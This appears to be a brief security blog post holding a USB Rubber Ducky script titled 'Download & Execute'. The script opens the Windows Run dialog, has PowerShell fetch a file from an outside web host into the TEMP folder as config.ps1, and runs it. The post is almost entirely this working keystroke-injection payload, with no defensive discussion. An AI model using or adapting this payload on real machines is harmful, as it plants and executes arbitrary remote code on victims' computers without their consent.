# Download &amp; Execute
## Ducky scripts, PowerShell, Security 
### URL: https://www.jesusninoc.com/2015/01/07/download-execute/
```PowerShell
DELAY 3000
GUI r
DELAY 100
STRING powershell Start-BitsTransfer -Source 'https://www.jesusninoc.com/wp-content/uploads/2014/12/config.txt' -Destination $env:TEMP\config.ps1;
DELAY 100
STRING powershell -File $env:TEMP\config.ps1
ENTER

```
